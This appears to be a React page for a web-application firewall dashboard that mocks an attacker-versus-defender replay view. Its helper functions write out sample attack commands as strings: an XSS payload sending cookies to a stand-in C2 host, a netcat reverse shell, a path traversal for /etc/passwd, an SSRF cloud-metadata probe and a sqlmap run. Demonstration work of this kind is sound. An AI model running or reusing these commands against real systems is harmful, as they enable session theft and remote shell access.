"use client";

import { useState, useEffect, useRef, useMemo } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Switch } from '@/components/ui/switch';
import { Label } from '@/components/ui/label';
import { 
  Terminal, Activity, Shield, Zap, Crosshair, 
  Search, Eye, Code, Layers, Lock, Unlock,
  ChevronRight, Database, Globe, Play, Loader2
} from 'lucide-react';
import { generateFakeRequest, getSeededData } from '@/lib/mock-data';
import { cn } from '@/lib/utils';

// --- HELPERS ---

const reconstructCommand = (attackType: string, endpoint: string) => {
  const url = `https://target-server.local${endpoint}`;
  switch (attackType) {
    case 'SQL Injection':
      return `sqlmap -u "${url}?id=1" --dbs --batch --level 5 --risk 3 --random-agent --tamper=base64encode`;
    case 'XSS':
      return `reflected-xss-scanner --url "${url}" --payload "<script>fetch('https://evil-c2.com/steal?c='+document.cookie)</script>"`;
    case 'Path Traversal':
      return `curl -v -G --data-urlencode "file=../../../../etc/passwd" "${url}"`;
    case 'Command Injection':
      return `nc -e /bin/sh 45.33.22.11 4444 | curl -X POST -d @- "${url}"`;
    case 'SSRF':
      return `curl -i -s "${url}?proxy=http://169.254.169.254/latest/meta-data/"`;
    case 'Buffer Overflow':
      return `python3 -c "print('A'*5000)" | nc target-server.local 80`;
    default:
      return `curl -X GET "${url}" -H "User-Agent: Mozilla/5.0"`;
  }
};

const getToolOutput = (attackType: string) => {
  switch (attackType) {
    case 'SQL Injection':
      return [
        "[INFO] testing connection to the target URL",
        "[INFO] checking if the target is protected by some WAF/IPS",
        "[INFO] testing if the target URL is stable",
        "[INFO] testing if parameter 'id' is dynamic",
        "[INFO] confirming SQL injection type 'boolean-based blind'",
        "[INFO] fetching database names...",
        "available databases [4]:",
        "[*] information_schema",
        "[*] shieldcore_prod",
        "[*] user_credentials",
        "[*] staging_db"
      ];
    case 'XSS':
      return [
        "[*] Scanning endpoint for DOM reflection...",
        "[+] Found potential reflection point in 'modo' parameter",
        "[*] Testing payload: <script>alert(1)</script>",
        "[!] ALERT: Potential WAF detected: SHIELDCORE",
        "[*] Attempting bypass using polyglot payload...",
        "[+] XSS SUCCESS: Execution confirmed in headless browser",
        "[*] Exfiltrating JSESSIONID to C2 server..."
      ];
    default:
      return [
        "[*] Initializing connection...",
        "[+] Connection established with target",
        "[*] Scanning headers...",
        "[-] No common vulnerabilities found in first pass",
        "[*] Attempting secondary enumeration..."
      ];
  }
};

// --- COMPONENTS ---

const Typewriter = ({ lines, delay = 50, onComplete }: { lines: string[], delay?: number, onComplete?: () => void }) => {
  const [currentLineIndex, setCurrentLineIndex] = useState(0);
  const [currentText, setCurrentText] = useState("");
  const [displayedLines, setDisplayedLines] = useState<string[]>([]);

  useEffect(() => {
    if (currentLineIndex >= lines.length) {
      onComplete?.();
      return;
    }

    const line = lines[currentLineIndex];
    if (currentText.length < line.length) {
      const timer = setTimeout(() => {
        setCurrentText(line.slice(0, currentText.length + 1));
      }, delay);
      return () => clearTimeout(timer);
    } else {
      const timer = setTimeout(() => {
        setDisplayedLines(prev => [...prev, line]);
        setCurrentText("");
        setCurrentLineIndex(prev => prev + 1);
      }, delay * 2);
      return () => clearTimeout(timer);
    }
  }, [currentLineIndex, currentText, lines, delay, onComplete]);

  return (
    <div className="space-y-1">
      {displayedLines.map((line, i) => (
        <div key={i} className="opacity-80 leading-tight">{line}</div>
      ))}
      <div className="flex">
        <span className="opacity-100">{currentText}</span>
        <span className="w-1.5 h-4 bg-emerald-500 ml-1 animate-pulse" />
      </div>
    </div>
  );
};

export default function AttackerMirrorPage() {
  const [attacks, setAttacks] = useState<any[]>([]);
  const [selectedAttack, setSelectedAttack] = useState<any | null>(null);
  const [isLive, setIsLive] = useState(true);
  const [isReplaying, setIsReplaying] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [replayKey, setReplayKey] = useState(0); // For forcing re-render of typewriter

  useEffect(() => {
    const seed = getSeededData().slice(0, 50);
    setAttacks(seed);
    if (seed.length > 0) setSelectedAttack(seed[0]);
  }, []);

  useEffect(() => {
    if (!isLive || isReplaying) return;
    const interval = setInterval(() => {
      const newReq = generateFakeRequest();
      setAttacks(prev => [newReq, ...prev].slice(0, 50));
      handleLoadAttack(newReq);
    }, 10000);
    return () => clearInterval(interval);
  }, [isLive, isReplaying]);

  const handleLoadAttack = (attack: any) => {
    setIsReplaying(true);
    setCountdown(3);
    setSelectedAttack(attack);
    
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsReplaying(false);
          setReplayKey(k => k + 1);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const toolOutput = useMemo(() => {
    return selectedAttack ? getToolOutput(selectedAttack.attackType) : [];
  }, [selectedAttack]);

  const attackerNotes = useMemo(() => {
    if (!selectedAttack) return [];
    return [
      `TARGET: ${selectedAttack.ip}`,
      `ENDPOINT: ${selectedAttack.endpoint}`,
      `METHOD: ${selectedAttack.method}`,
      `WAF DETECTED: SHIELDCORE`,
      `EVASION: ${selectedAttack.attackType === 'Safe' ? 'NONE' : 'ENCODED_PAYLOAD'}`,
      `GOAL: Enumeration & Exfiltration`
    ];
  }, [selectedAttack]);

  return (
    <div className="relative min-h-screen bg-black overflow-hidden dashboard-cursor selection:bg-destructive/30">
      
      {/* HUD OVERLAY */}
      <div className="absolute top-24 left-1/2 -translate-x-1/2 z-[100] flex items-center gap-6 px-8 py-3 bg-black/80 backdrop-blur-xl border border-white/10 rounded-2xl shadow-2xl">
        <div className="flex items-center gap-3">
          <Switch id="live-mode" checked={isLive} onCheckedChange={setIsLive} />
          <Label htmlFor="live-mode" className="text-[10px] font-black uppercase tracking-widest opacity-60">Intercept Live Uplink</Label>
        </div>
        <div className="w-[1px] h-6 bg-white/10" />
        <div className="flex items-center gap-3">
          <Activity className="h-4 w-4 text-destructive animate-pulse" />
          <span className="text-[10px] font-black uppercase tracking-widest opacity-60">Threat Capture Active</span>
        </div>
      </div>

      {/* SPLIT SCREEN */}
      <div className="flex h-screen w-full relative pt-20">
        
        {/* CENTER DIVIDER */}
        <div className="absolute left-1/2 top-20 bottom-0 w-[2px] bg-destructive/40 z-50 flex items-center justify-center">
          <div className="h-full w-full bg-gradient-to-b from-transparent via-destructive to-transparent animate-pulse" />
          <div className="absolute top-1/2 -translate-y-1/2 flex flex-col items-center gap-2">
            <div className="h-10 w-10 bg-black border-2 border-destructive rounded-full flex items-center justify-center animate-blocked-shimmer">
              <span className="text-[10px] font-black text-destructive italic">VS</span>
            </div>
            <div className="flex flex-col gap-1 items-center">
              {[1, 2, 3].map(i => (
                <div key={i} className="h-1 w-1 bg-destructive rounded-full animate-ping" style={{ animationDelay: `${i * 0.3}s` }} />
              ))}
            </div>
          </div>
        </div>

        {/* LEFT: ATTACKER SIDE */}
        <div className="w-1/2 h-full bg-[#050505] relative overflow-hidden flex flex-col p-12 space-y-8">
          <div className="absolute inset-0 opacity-[0.03] pointer-events-none select-none z-0">
            <div className="h-full w-full bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_2px,3px_100%]" />
          </div>

          <div className="flex justify-between items-start relative z-10">
            <div className="space-y-1">
              <div className="flex items-center gap-2 text-destructive font-mono text-[10px] tracking-[0.4em] uppercase">
                <Terminal className="h-3 w-3" /> Terminal Access
              </div>
              <h2 className="text-4xl font-black tracking-tighter text-white/90">ATTACKER <span className="text-destructive">DOMAIN</span></h2>
            </div>
            <Badge variant="outline" className="bg-destructive/10 border-destructive/30 text-destructive text-[10px] font-mono px-4 py-1.5 uppercase">
              NODE: {selectedAttack?.ip || 'SEARCHING...'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 gap-6 flex-1 overflow-hidden relative z-10">
            
            {/* TERMINAL WINDOW */}
            <Card className="bg-black/80 border-white/5 rounded-2xl overflow-hidden flex flex-col shadow-2xl">
              <div className="bg-white/5 px-4 py-2 flex items-center justify-between border-b border-white/5">
                <div className="flex gap-1.5">
                  <div className="h-2 w-2 rounded-full bg-destructive/40" />
                  <div className="h-2 w-2 rounded-full bg-amber-500/40" />
                  <div className="h-2 w-2 rounded-full bg-emerald-500/40" />
                </div>
                <div className="text-[9px] font-mono opacity-30 text-white uppercase tracking-widest">shell@attacker-c2:~</div>
              </div>
              <CardContent className="p-6 font-mono text-[11px] text-emerald-500/80 flex-1 overflow-auto custom-scrollbar no-scrollbar">
                {!isReplaying && selectedAttack ? (
                  <div key={replayKey} className="space-y-4">
                    <div className="flex gap-2 text-white/40">
                      <span className="text-emerald-500">root@c2:~$</span>
                      <Typewriter lines={[reconstructCommand(selectedAttack.attackType, selectedAttack.endpoint)]} delay={30} />
                    </div>
                    <div className="pt-4 border-t border-white/5">
                      <Typewriter lines={toolOutput} delay={40} />
                    </div>
                  </div>
                ) : (
                  <div className="h-full flex flex-col items-center justify-center space-y-4 opacity-20">
                    <Loader2 className="h-8 w-8 animate-spin" />
                    <span className="text-[10px] uppercase tracking-[0.3em]">Synching with origin node...</span>
                  </div>
                )}
              </CardContent>
            </Card>

            <div className="grid grid-cols-2 gap-6 h-1/3">
              {/* RECON NOTES */}
              <Card className="bg-black/60 border-white/5 rounded-2xl p-6 relative">
                <div className="absolute top-0 left-0 w-full h-1 bg-destructive/20" />
                <h4 className="text-[10px] font-black text-destructive uppercase tracking-widest mb-4 flex items-center gap-2">
                  <Search className="h-3 w-3" /> Recon Intelligence
                </h4>
                <div className="font-mono text-[10px] text-white/40 space-y-2">
                  {!isReplaying ? (
                    <Typewriter key={replayKey} lines={attackerNotes} delay={20} />
                  ) : (
                    <div className="h-full w-full bg-white/5 animate-pulse rounded" />
                  )}
                </div>
              </Card>

              {/* TARGET VIEWPORT */}
              <Card className="bg-black/60 border-white/5 rounded-2xl overflow-hidden flex flex-col relative group">
                <div className="absolute inset-0 bg-destructive/5 opacity-0 group-hover:opacity-100 transition-opacity z-10 pointer-events-none" />
                <div className="bg-white/5 px-4 py-2 flex items-center justify-between">
                  <span className="text-[8px] font-mono text-white/30 uppercase tracking-widest">External Viewport: target.local</span>
                  <div className="flex gap-1">
                    <div className="h-1 w-4 bg-white/10 rounded-full" />
                    <div className="h-1 w-2 bg-white/10 rounded-full" />
                  </div>
                </div>
                <div className="flex-1 flex items-center justify-center p-4 bg-white/[0.02]">
                   <div className="w-full h-full border border-white/5 rounded-lg flex flex-col p-4 space-y-3 relative overflow-hidden">
                      <div className="absolute inset-0 scanline opacity-10 pointer-events-none" />
                      <div className="h-4 w-1/2 bg-white/5 rounded" />
                      <div className="space-y-2">
                        <div className="h-2 w-full bg-white/[0.02] rounded" />
                        <div className="h-2 w-full bg-white/[0.02] rounded" />
                        <div className="h-2 w-3/4 bg-white/[0.02] rounded" />
                      </div>
                      <div className="mt-auto h-8 w-full border border-white/10 rounded-md flex items-center justify-center">
                        <span className="text-[8px] font-black uppercase text-white/20">Protected Interface</span>
                      </div>
                   </div>
                </div>
              </Card>
            </div>
          </div>
        </div>

        {/* RIGHT: DEFENDER SIDE */}
        <div className="w-1/2 h-full bg-[#020408] relative overflow-hidden flex flex-col p-12 space-y-8">
          <div className="flex justify-between items-start relative z-10">
             <div className="space-y-1">
              <div className="flex items-center gap-2 text-cyan-500 font-mono text-[10px] tracking-[0.4em] uppercase animate-pulse">
                <Shield className="h-3 w-3" /> Core Defense Uplink
              </div>
              <h2 className="text-4xl font-black tracking-tighter text-white/90">DEFENDER <span className="text-cyan-500">DOMAIN</span></h2>
            </div>
            <div className="flex gap-3">
              <Badge variant="outline" className="bg-cyan-500/10 border-cyan-500/30 text-cyan-500 text-[10px] font-mono px-4 py-1.5 uppercase">
                LATENCY: {selectedAttack?.inferenceTime || 0}ms
              </Badge>
              <Badge variant="outline" className="bg-cyan-500/10 border-cyan-500/30 text-cyan-500 text-[10px] font-mono px-4 py-1.5 uppercase">
                NODE: 1.2.4 CLUSTER
              </Badge>
            </div>
          </div>

          <div className="flex-1 grid grid-cols-1 gap-6 relative z-10 overflow-hidden">
            
            {/* RAW REQUEST */}
            <Card className="bg-black/40 border-white/5 rounded-2xl overflow-hidden flex flex-col">
              <div className="bg-white/5 px-6 py-3 flex items-center justify-between border-b border-white/5">
                <div className="flex items-center gap-3">
                  <Zap className="h-3.5 w-3.5 text-cyan-500" />
                  <span className="text-[10px] font-black text-white/60 uppercase tracking-widest">Ingress Forensics</span>
                </div>
                <div className="text-[8px] font-mono text-cyan-500/40 uppercase">Capture Epoch: {Date.now()}</div>
              </div>
              <CardContent className="p-6 font-mono text-[11px] text-white/70 overflow-auto custom-scrollbar no-scrollbar flex-1">
                {!isReplaying ? (
                  <Typewriter key={replayKey} lines={selectedAttack?.payload?.split('\n') || []} delay={10} />
                ) : (
                  <div className="h-full flex items-center justify-center">
                    <div className="w-1/2 h-2 bg-white/5 rounded-full overflow-hidden">
                      <div className="h-full bg-cyan-500 animate-progress-fast" />
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>

            <div className="grid grid-cols-2 gap-6 h-1/2">
              {/* DECODE PIPELINE */}
              <Card className="bg-black/40 border-white/5 rounded-2xl p-6 space-y-6 flex flex-col">
                <h4 className="text-[10px] font-black text-cyan-500 uppercase tracking-widest flex items-center gap-2">
                  <Layers className="h-3 w-3" /> De-obfuscation Pipeline
                </h4>
                <div className="flex-1 space-y-4">
                  {[
                    { name: 'Unicode Norm', status: 'COMPLETE', color: 'text-emerald-500' },
                    { name: 'URL Decode', status: 'STRIPPED (2)', color: 'text-emerald-500' },
                    { name: 'Base64 Strip', status: 'NONE', color: 'text-white/20' }
                  ].map((step, i) => (
                    <div key={i} className={cn(
                      "flex items-center justify-between p-3 bg-white/[0.02] border border-white/5 rounded-xl transition-all duration-700",
                      isReplaying ? "opacity-30 blur-sm scale-95" : "opacity-100 blur-0 scale-100"
                    )} style={{ transitionDelay: `${i * 300}ms` }}>
                      <span className="text-[10px] font-bold text-white/60 uppercase">{step.name}</span>
                      <span className={cn("text-[8px] font-black font-mono", step.color)}>{step.status}</span>
                    </div>
                  ))}
                  <div className="pt-2">
                    <div className="p-3 bg-cyan-500/10 border border-cyan-500/20 rounded-xl">
                      <p className="text-[8px] font-black text-cyan-500 uppercase mb-1">Decoded Kernel</p>
                      <p className="text-[9px] font-mono text-white/40 truncate">
                        {isReplaying ? 'Processing...' : (selectedAttack?.attackType === 'Safe' ? 'No patterns detected' : selectedAttack?.payload)}
                      </p>
                    </div>
                  </div>
                </div>
              </Card>

              {/* CONFIDENCE & VERDICT */}
              <div className="flex flex-col gap-6">
                <Card className="bg-black/40 border-white/5 rounded-2xl p-6 flex flex-col items-center justify-center flex-1 relative overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-t from-cyan-500/5 to-transparent pointer-events-none" />
                  <div className="relative h-32 w-32 flex items-center justify-center mb-2">
                    <svg className="w-full h-full transform -rotate-90">
                      <circle cx="64" cy="64" r="58" stroke="currentColor" strokeWidth="6" fill="transparent" className="text-white/5" />
                      <circle 
                        cx="64" 
                        cy="64" 
                        r="58" 
                        stroke="currentColor" 
                        strokeWidth="6" 
                        fill="transparent" 
                        strokeDasharray={364} 
                        strokeDashoffset={isReplaying ? 364 : 364 - ((selectedAttack?.score || 0) * 364)} 
                        className="text-cyan-500 transition-all duration-1000" 
                      />
                    </svg>
                    <div className="absolute inset-0 flex flex-col items-center justify-center">
                      <span className="text-2xl font-black text-white">{isReplaying ? '--' : Math.round((selectedAttack?.score || 0) * 100)}%</span>
                      <span className="text-[8px] font-black uppercase text-white/40">Confidence</span>
                    </div>
                  </div>
                  <Badge variant="outline" className="border-cyan-500/30 text-cyan-500 text-[10px] font-black uppercase">Neural Inference</Badge>
                </Card>

                <Card className={cn(
                  "border-2 rounded-2xl p-6 flex flex-col items-center justify-center transition-all duration-1000",
                  isReplaying ? "bg-black/40 border-white/5" : (selectedAttack?.decision === 'BLOCKED' ? "bg-destructive/10 border-destructive animate-blocked-shimmer" : "bg-emerald-500/10 border-emerald-500")
                )}>
                  <div className="text-center">
                    <p className="text-[10px] font-black uppercase tracking-[0.2em] text-white/40 mb-2">System Verdict</p>
                    <h3 className={cn(
                      "text-4xl font-black tracking-tighter uppercase mb-1",
                      selectedAttack?.decision === 'BLOCKED' ? "text-destructive" : "text-emerald-500"
                    )}>
                      {isReplaying ? 'REPLAYING' : selectedAttack?.decision}
                    </h3>
                    <p className="text-[9px] font-mono text-white/20 uppercase tracking-widest">{selectedAttack?.attackType}</p>
                  </div>
                </Card>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* TIMELINE SCRUBBER */}
      <div className="fixed bottom-0 left-0 w-full h-24 bg-black/90 backdrop-blur-3xl border-t border-white/10 z-[1000] p-6 flex items-center gap-8">
        <div className="flex flex-col">
          <span className="text-[10px] font-black uppercase tracking-widest text-white/40 mb-1">Session Mirror</span>
          <span className="text-xs font-mono font-bold text-white/80">{attacks.length} Events Logged</span>
        </div>
        
        <div className="flex-1 flex items-center gap-1.5 overflow-x-auto no-scrollbar py-4">
          {attacks.map((atk, i) => (
            <button
              key={atk.id}
              onClick={() => handleLoadAttack(atk)}
              className={cn(
                "h-3 min-w-3 rounded-full transition-all hover:scale-150",
                selectedAttack?.id === atk.id ? "ring-2 ring-white ring-offset-2 ring-offset-black scale-150" : "opacity-40 hover:opacity-100",
                atk.decision === 'BLOCKED' ? "bg-destructive" : "bg-emerald-500"
              )}
            />
          ))}
        </div>

        <div className="flex items-center gap-6">
           {isReplaying && (
             <div className="flex items-center gap-3">
               <span className="text-[10px] font-black text-destructive uppercase tracking-widest animate-pulse">Replay Active</span>
               <div className="h-10 w-10 border-2 border-destructive rounded-full flex items-center justify-center">
                 <span className="text-xl font-black text-white">{countdown}</span>
               </div>
             </div>
           )}
           <Button variant="outline" className="h-12 border-white/10 bg-white/5 hover:bg-white/10 text-white font-black uppercase text-[10px] tracking-widest px-8 rounded-xl" onClick={() => handleLoadAttack(attacks[0])}>
             <RefreshCw className={cn("h-4 w-4 mr-3", isReplaying && "animate-spin")} /> Replay Head
           </Button>
        </div>
      </div>

      {/* REPLAY OVERLAY */}
      {isReplaying && (
        <div className="fixed inset-0 z-[2000] bg-black/60 backdrop-blur-sm flex items-center justify-center animate-in fade-in duration-500">
           <div className="flex flex-col items-center gap-6">
              <div className="p-8 bg-destructive/20 border border-destructive/40 rounded-full animate-ping">
                <Crosshair className="h-20 w-20 text-destructive" />
              </div>
              <h2 className="text-6xl font-black text-white tracking-tighter uppercase animate-pulse">Intercepting Session {countdown}</h2>
           </div>
        </div>
      )}

      <style jsx global>{`
        .scanline {
          width: 100%;
          height: 100px;
          z-index: 5;
          background: linear-gradient(0deg, rgba(239, 68, 68, 0) 0%, rgba(239, 68, 68, 0.1) 50%, rgba(239, 68, 68, 0) 100%);
          opacity: 0.1;
          position: absolute;
          bottom: 100%;
          animation: scanline 4s linear infinite;
        }

        @keyframes scanline {
          0% { bottom: 100%; }
          100% { bottom: -100px; }
        }

        .no-scrollbar::-webkit-scrollbar {
          display: none;
        }
        .no-scrollbar {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
      `}</style>

    </div>
  );
}

const RefreshCw = ({ className, ...props }: any) => (
  <svg 
    xmlns="http://www.w3.org/2000/svg" 
    viewBox="0 0 24 24" 
    fill="none" 
    stroke="currentColor" 
    strokeWidth="2" 
    strokeLinecap="round" 
    strokeLinejoin="round" 
    className={className}
    {...props}
  >
    <path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8" />
    <path d="M3 3v5h5" />
    <path d="M3 12a9 9 0 0 0 9 9 9.75 9.75 0 0 0 6.74-2.74L21 16" />
    <path d="M16 16h5v5" />
  </svg>
);
